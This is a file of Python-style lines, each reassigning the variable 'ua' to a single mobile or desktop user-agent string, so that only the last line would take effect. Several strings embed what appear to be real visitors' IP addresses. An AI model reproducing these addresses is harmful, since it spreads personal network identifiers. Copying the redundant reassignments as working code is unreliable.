ua = ["Mozilla/5.0 (Linux; Android 11; SM-A805F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; 9.1; YT9218D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; 220333QNY Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["TuneIn Radio/24.6.2; iPad11,7; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3623 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3269 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; Redmi Note 7 Build/SQ3A.220705.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["TuneIn Radio Pro/25.1.0; iPad13,18; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 10; S59 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone11,8; iOS 16_0_3; tr_TR; tr-TR; scale=2.00; 828x1792; 455531335)",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2271 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 [ip:151.76.119.47",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:79.56.51.1",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-A530F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; ASUS_I002D Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/400.1.0.29.86;FBBV/456486911;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2399 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone14,2; iOS 16_2; tr_TR; tr-TR; scale=3.00; 1170x2532; 455531335)",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH2089 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; ASUS_Z01KS Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; S88Plus Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2201116PG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2023 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; 22071212AG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41 Config/90.2.8151.52",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.7.38.00 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; motorola one action Build/RSBS31.Q1-48-36-26; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 [ip:37.160.146.27",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4662026496)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; 2201122C Build/N2G47H)",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; 4.4.2; SUPRA M748G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",]
ua = ["Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.0.34.18 (DIGIHOME, Mxl661LG32, wireless) VSTVB_MB97 SmartTvA/3.0.0",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["UCWEB/2.0 (Windows; U; wds 8.0; en-US; NOKIA; RM-914eurussia229) U2/1.0.0 UCBrowser/3.4.1.407 U2/1.0.0 Mobile",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:151.29.41.6",]
ua = ["Opera/5.0 (Windows; Windows NT 6.1; en-us) like Gecko Safari/533.51",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.71.101",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A515F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118458",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A025G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (5098233024)",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2210129SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 EdgA/110.0.1587.66",]
ua = ["Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:37.163.16.253",]
ua = ["Mozilla/5.0 (Linux; Android 9; moto e6 play Build/POAS29.550-132-25; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2010J19CG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 [ip:151.47.66.179",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; moto e5 Build/OPPS27.91-176-11-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:93.36.176.173",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; LM-X410.F Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 9; S40 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 [ip:37.161.65.123",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2371 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118458",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.43",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; LG-M400 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 [ip:151.57.48.177",]
ua = ["Mozilla/5.0 (Linux; Android 9; TA-1004 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g41 Build/S3RWS32.138-29-3-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.41.211]",]
ua = ["Mozilla/5.0 (Linux; Android 9; VKY-L09 Build/HUAWEIVKY-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A326B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) power Build/QQ3A.200805.001)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; nami Build/R110-15278.72.0)",]
ua = ["Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QPOS30.52-29-7-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230305.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; HD1900 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A325F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44 [ip:79.21.53.92",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A380 [FBAN/FBIOS;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.2;FBSS/3;FBID/phone;FBLC/ro_RO;FBOP/5",]
ua = ["Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3241 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; G8141) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["TuneIn Radio Pro/25.1.0; iPad13,1; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2067) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:79.35.142.204",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2103K19G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [ip:95.74.97.237",]
